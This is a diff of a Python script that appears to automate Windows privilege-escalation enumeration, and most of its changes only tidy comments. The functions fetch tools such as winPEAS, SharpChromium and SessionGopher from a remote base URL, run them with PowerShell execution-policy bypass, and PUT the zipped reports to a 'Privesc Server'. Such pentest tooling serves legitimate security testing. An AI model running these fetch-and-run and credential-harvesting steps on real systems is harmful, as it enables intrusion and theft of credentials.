@@ -127,7 +127,6 @@ def edit_and_send(directory, mode):
     # Zip the folder with all the reports and send it to the Privesc Server with PUT method and cleans al the files
     read_files = glob.glob("*.txt")
     base_name = directory + '-' + mode
-    
     with open("result.txt", "wb") as outfile:
         for f in read_files:
             with open(f, "rb") as infile:
@@ -144,7 +143,6 @@ def edit_and_send(directory, mode):
     os.remove('result.txt')
     file_paths = []
     os.chdir('..')
-    
     for root, directories, files in os.walk(base_name):
         for filename in files:
             filepath = os.path.join(root, filename)
@@ -179,9 +177,9 @@ All The Tools in This Script
 
 def winPEAS(base_url):
     # winPEAS
-    # Last Update: 18/08/2020
     # Github: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
     # Author: carlospolop
+
     winPAES = "winPEAS.exe"
     winPEAS_url = base_url + "winPEAS.exe"
     print('\n[+] Running winPEAS Scan ')
@@ -191,9 +189,9 @@ def winPEAS(base_url):
 
 def Seatbelt(base_url):
     # Seatbelt
-    # Last Update: 18/08/2020
     # Github: https://github.com/Lexus89/SharpPack/tree/master/Seatbelt
     # Author: Lexus89
+
     Seatbealt = 'Seatbelt.exe -group=all -full'
     Seatbealt_url = base_url + 'Seatbelt.exe'
     print('\n[+] Starting Seatbelt Scan ')
@@ -203,9 +201,9 @@ def Seatbelt(base_url):
 
 def JAWS(base_url):
     # J.A.W.S
-    # Last Update: 18/08/2020
     # Github: https://github.com/411Hall/JAWS
     # Author: 411Hall
+
     jaws = "powershell.exe  -ExecutionPolicy Bypass -file jaws-enum.ps1"
     jaws_url = base_url + 'jaws-enum.ps1'
     print('\n[+] Running J.A.W.S Scan ')
@@ -215,9 +213,9 @@ def JAWS(base_url):
 
 def Powerless(base_url):
     # Powerless
-    # Last Update: 18/08/2020
     # Github: https://github.com/M4ximuss/Powerless
     # Author: M4ximuss
+
     Powerless_url = base_url + 'Powerless.bat'
     print('\n[+] Running Powerless Scan ')
     WinCheck_bat_file(url=Powerless_url, output_file='Powerless.txt', input_file='Powerless.bat')
@@ -228,7 +226,7 @@ def winEnum_wmic(base_url):
     # winEnum_wmic
     # Author: greyshell
     # Github: Unknow
-    # Last Update: 18/08/2020
+
     winEnum_wmic_url = base_url + 'winEnum_wmic_v2.0.bat'
     print('\n[+] Running winEnum_wmic Scan ')
     WinCheck_bat_file(url=winEnum_wmic_url, output_file='winEnum_wmic.txt', input_file='winEnum_wmic.bat')
@@ -237,9 +235,9 @@ def winEnum_wmic(base_url):
 
 def winPE(base_url):
     # winPE
-    # Last Update: 18/08/2020
     # Github: https://github.com/carlospolop/winPE
     # Author: carlospolop
+
     winPE_url = base_url + 'winPE.bat'
     print('\n[+] Running winPE Scan ')
     WinCheck_bat_file(url=winPE_url, output_file='winPE.txt', input_file='winPE.bat')
@@ -248,22 +246,21 @@ def winPE(base_url):
 
 def InvokePrivescCheck(base_url):
     # Invoke-PrivescCheck
-    # Last Update: 18/08/2020
     # Github: https://github.com/itm4n/PrivescCheck
     # Author: itm4n
-    PrivescCheck_url = base_url + 'Invoke-PrivescCheck.ps1'
-    PrivescCheck = 'powershell -ep bypass Import-Module .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck -Extended'
+    PrivescCheck_url = base_url + 'PrivescCheck.ps1'
+    PrivescCheck = 'powershell -ep bypass Import-Module .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended'
     print('\n[+] Running Invoke-PrivescCheck Scan ')
     WinCheck(cmd=PrivescCheck, url=PrivescCheck_url, output_file='Invoke-PrivescCheck.txt',
-             input_file='Invoke-PrivescCheck.ps1')
+             input_file='PrivescCheck.ps1')
     print('[$] Done Invoke-PrivescCheck Scan ')
 
 
 def SharpChromium(base_url):
     # SharpChromium
-    # Last Update: 18/08/2020
     # Github: https://github.com/djhohnstein/SharpChromium
     # Author: djhohnstein
+
     SharpChromium_url = base_url + 'SharpChromium.exe'
     SharpChromium = 'SharpChromium.exe full'
     print('\n[+] Running SharpChromium Scan ')
@@ -274,9 +271,9 @@ def SharpChromium(base_url):
 
 def Watson(base_url):
     # Watson
-    # Last Update: 18/08/2020
     # Github: https://github.com/rasta-mouse/Watson
     # Author: rasta-mouse
+
     Watson_url = base_url + 'Watson.exe'
     Watson = 'Watson.exe'
     print('\n[+] Running Watson Scan ')
@@ -286,9 +283,9 @@ def Watson(base_url):
 
 def SessionGopher(base_url):
     # SessionGopher
-    # Last Update: 18/08/2020
     # Github: https://github.com/Arvanaghi/SessionGopher
     # Author: Arvanaghi
+
     SessionGopher_url = base_url + 'SessionGopher.ps1'
     SessionGopher = 'powershell -ep bypass Import-Module .\SessionGopher.ps1; Invoke-SessionGopher -Thorough'
     print('\n[+] Running SessionGopher Scan ')
@@ -299,9 +296,9 @@ def SessionGopher(base_url):
 
 def Sherlock(base_url):
     # Sherlock
-    # Last Update: 18/08/2020
-    # Github:https://github.com/rasta-mouse/Sherlock
+    # Github: https://github.com/rasta-mouse/Sherlock
     # Author: rasta-mouse
+
     Sherlock_url = base_url + 'Sherlock.ps1'
     Sherlock = 'powershell -ep bypass Import-Module .\Sherlock.ps1; Find-AllVulns'
     print('\n[+] Running Sherlock Scan ')
@@ -311,9 +308,9 @@ def Sherlock(base_url):
 
 def Check_Service(base_url):
     # Check-Service-Paths
-    # Last Update: 18/08/2020
     # Github: https://github.com/BleepSec/Check-Service-Paths
     # Author: BleepSec
+
     Check_Service_url = base_url + 'Check-Service-Paths.ps1'
     Check_Service = 'powershell -ep bypass .\Check-Service-Paths.ps1'
     print('\n[+] Running Check-Service-Paths Scan ')
@@ -324,9 +321,9 @@ def Check_Service(base_url):
 
 def SharpUp(base_url):
     # SharpUp
-    # Last Update: 18/08/2020
     # Github: https://github.com/GhostPack/SharpUp
     # Author: harmj0y
+
     SharpUp_url = base_url + 'SharpUp.exe'
     SharpUp = 'SharpUp.exe'
     print('\n[+] Running SharpUp Scan ')
@@ -336,9 +333,9 @@ def SharpUp(base_url):
 
 def privesc(base_url):
     # privesc
-    # Last Update: 18/08/2020
     # Github: https://github.com/enjoiz/Privesc
     # Author: enjoiz
+
     privesc_url = base_url + 'privesc.ps1'
     privesc = 'powershell -ep bypass Import-Module .\privesc.ps1; invoke-privesc'
     print('\n[+] Running privesc Scan ')
